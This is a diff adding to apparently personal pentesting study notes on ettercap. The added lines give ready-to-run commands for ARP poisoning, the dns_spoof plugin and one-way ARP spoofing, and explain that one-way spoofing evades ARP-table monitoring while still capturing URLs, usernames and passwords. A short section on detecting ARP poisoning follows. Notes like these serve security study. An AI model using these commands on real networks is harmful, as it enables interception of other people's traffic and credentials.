@@ -203,8 +203,45 @@ ettercap -Tq -M arp:remote -i eth0 /10.20.30.1// /10.20.30.44//
 ettercap -Tq -M arp:remote -i eth0 /10.20.30.1// /10.20.30.44-77//
 ettercap -Tq -M arp:remote -i eth0 /10.20.30.1// /10.20.30.44,10.20.30.77//
 ```
+- Ettercap has a number of plugins.
+- Plugins can be used to:
+  - Auto-add new clients → autoadd.
+  - Re-poison clients after arp broadcasts → repoison_arp.
+  - DNS spoof targets → dns_spoof.
+  - + more.
+```
+ettercap -Tq -M arp:remote -i eth0 ///
+Pres P
+autoadd
+```
+DNS Spoofing Using Etterca
+```
+leafpad /etc/ettercap/etter.dns
+service apache2 start
+ettercap -Tq -M arp:remote -i eth0 -S -P dns_spoof /10.20.30.1// /10.20.30.44//
+```
+One way arp spoofing
+```
+first the victim ip then the AP ip
+ettercap -Tq -M arp:oneway -i eth0 -S /10.20.30.44// /10.20.30.1//
+```
 
-Detectar Arp Poisoning:  
+
+## Arp Spofing
+![Screenshot 2021-09-17 at 13 25 12](https://user-images.githubusercontent.com/87951795/133774898-9cab0947-39fb-4d9c-bb19-5d9c95f44c16.png)
+If the access point implements a way to keep an eye on the ARP tables, for example, of their using a solution like ARP
+watch or any other solution that depends on the ARP table to discover ARP spoofing attacks, then the only way to bypass this is to use one way spoofing in one way spoofing.
+![Screenshot 2021-09-17 at 13 24 58](https://user-images.githubusercontent.com/87951795/133774907-fe0e1d12-0934-4b4a-9d58-c3957e2d0cf2.png)
+So with this method, anything that the victim requests will go through the hacker, but the responses
+will come directly to the victim.
+This way, the hacker will not be able to see the responses.
+So they won't be able to play around with the responses, change the code or inject stuff on the browser.
+But the hacker will still be able to capture the requests.
+So they're still be able to see the URLs.
+They'll still be able to see usernames, passwords, run an dns spoofing attack downgrade https to HTTP.
+
+
+## Detectar Arp Poisoning:  
 comprovamos que los mac de las ips son unicos  
 ```
 arp -a  
